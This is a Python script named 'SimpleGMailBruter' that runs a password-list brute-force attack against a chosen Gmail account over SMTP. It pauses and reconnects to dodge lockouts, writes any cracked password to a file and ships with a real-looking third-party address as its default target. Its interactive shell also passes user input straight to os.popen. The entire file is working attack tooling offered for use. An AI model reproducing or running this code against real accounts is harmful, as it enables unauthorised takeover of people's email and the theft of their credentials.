import smtplib , os , sys , time

Count = 0
_Count = 0

def Banner():
	Ban = "\n\t\t\t[>] SimpleGMailBruter [<]\n"; print(Ban)

def StartBruteAccount(Passlist,account,SMTPServer,Count,_Count,Time):
	with open('{0}'.format(Passlist),'r') as PasswordsFile:
		for Password in PasswordsFile:
			Password = Password.rstrip("\n")
			try:
				SMTPServer.login(account,Password)
				print("[+] Valid Password Has Been Found: {0}, For: {1}".format(Password,account))
				
				# Create Data File!
				with open('credits.txt' , 'a') as DataFile:
					DataFile.write("\n--------------------------------------->"); DataFile.write("[+] Email: {0}\n".format(account)); DataFile.write("[+] Password: {0}\n".format(Password)); DataFile.write("--------------------------------------->");DataFile.close()
				exit()
			except smtplib.SMTPAuthenticationError:
				Count += 1; _Count += 1
				if Count == 20:
					print("\n[!] Sleeping For {0} Seconds.".format(str(Time))); time.sleep(int(Time)); Count = 0
					SMTPServer.close()

					SMTPServer = StartSMTPServiceForGmail()
				else:
					print("\rBad Password: {0}".format(Password + "   ") , end="")
					sys.stdout.flush()
			except Exception as e:
				if "please run connect() first" in str(e):
					SMTPServer.close()
					print("\nThe SMTP Server Disconnected. Please Run The Tool Again After Changing Your IP Address Or After Waiting Sometime"); exit()
				else:
					print("Error: " + str(e))

def StartSMTPServiceForGmail():
	SMTPServer = smtplib.SMTP('smtp.gmail.com', 587)
	SMTPServer.ehlo()
	SMTPServer.starttls()
	return SMTPServer

def HelpGuide():
	print("\nHelp Guide For GmailBruterV2.")
	print("Commands For Shell:")
	print("\thelp\t\t--\tTo Show This Messages")
	print("\tset target\t--\tTo Set The Victim Email Address")
	print("\tset time\t--\tTo Set Time Between Every 10 Faild Passwords")
	print("\tset list\t--\tTo Set PassList Name ")
	print("\tshow target\t--\tTo Show You Current Target ")
	print("\tshow time\t--\tTo Show You Current Time ")
	print("\tshow list\t--\tTo Show You Current List ")
	print("\tload\t\t--\tLoad Local Config For Settings")
	print("\tstart\t\t--\tTo Start Brute Force Attack\n")
	print("\texit\t\t--\tClose The Shell")

def ContactMe():
	Gmail =  "mdaif1332@gmail.com" # Don't perform the brute-force attacks on my email.

def StartShell():
	# store how many times the user pressed Ctrl + C
	AbortCount = 0
	Commands = []
	Account = "branadunlap@gmail.com"
	Time = '10'
	PassList = 'passlist.txt'
	with open(os.path.join("data" , "Commands") ,'r') as CommandsFile:
		for Command in CommandsFile:
			Command = Command.rstrip("\n")
			Commands.append(Command)
	while True:
		# init variable to store user input
		ShellResponse = 'temp'
		try:
			# get input from user
			ShellResponse = input("root@GmailBruter: ")

		# handle Ctrl + C
		except KeyboardInterrupt:
			# increment AbortCount
			AbortCount += 1
			# print \n to print the new shell line on the next line
			print()
			# if the user pressed Ctrl + C two times
			if AbortCount >= 2:
				# print hint
				print("[!] Press Ctrl + D or enter 'exit' to abort the program.")
				# reset abortcount
				AbortCount = 0
			continue
		# handle Ctrl + D
		# Ctrl + D normally indicated the end of a file
		# this is why python throws an EOFError
		except EOFError:
			print()
			exit()

		if ShellResponse.lower().replace(' ' , '') not in Commands:
			if "s-" in ShellResponse.lower():
				Command = ShellResponse.split("-"); Command = Command[1]
				Results = os.popen(Command).read()
				print("Command:" + Command)
				print("Results: \n{0}".format(Results))
			else:
				print("Can't find the command: '{0}'".format(ShellResponse))
		elif ShellResponse.lower() == "help":
			HelpGuide()
		elif ShellResponse.lower().replace(' ' , '') == "settarget":
			Account = input("Target: ")
		elif ShellResponse.lower().replace(' ' , '') == "settime":
			Time = input("Time: ")
		elif ShellResponse.lower().replace(' ' , '') == "setlist":
			PassList = input("List: ")
		elif ShellResponse.lower().replace(' ' , '') == "showtarget":
			if Account == '':
				print("[-] There's no target on the settings")
			else:
				print("Target: " + Account)
		elif ShellResponse.lower().replace(' ' , '') == "showtime":
			if Time == '':
				print("[-] There's no time has been set")
			else:
				print("Time: " + Time)
		elif ShellResponse.lower().replace(' ' , '') == "showlist":
			if PassList == '':
				print("[-] You didn't select a list")
			else:
				print("List: " + PassList)
		elif ShellResponse.lower() == "start":
			StartSMTPServiceForGmail()
			Service = StartSMTPServiceForGmail()
			if Account == '':
				print("[!] Set Target!")
				break
			elif PassList == '':
				print("[!] Set List!")
				break
			elif Time == '':
				print("[!] Set Time!")
				break
			else:
				StartBruteAccount(PassList,Account,Service,Count,_Count,Time)
		elif ShellResponse.lower() == "exit":
			exit()
		elif ShellResponse.lower() == "load":
			Config = input("Path: ")
			if os.path.exists(Config):
				Settings = open(Config , 'r')

				for Line in Settings:
					Line = Line.rstrip("\n"); Options = Line.split(":")

					try:
						if Options[0] == "email":
							Account = Options[1]
							print("Target: {0}".format(Options[1]))
						elif Options[0] == "list":
							PassList = Options[1]
							print("List: {0}".format(PassList))
						elif Options[0] == "time":
							Time = Options[1]
							print("Time: {0}".format(Time))
						else:
							print("[-] Invalid Config. Please check it again.")
					except Exception:
						print("[-] Invalid Config. Please check it again.")
			else:
				print("[-] The config file you selected doesn't exists")
		else:
			pass

# Start
Banner()
StartShell()
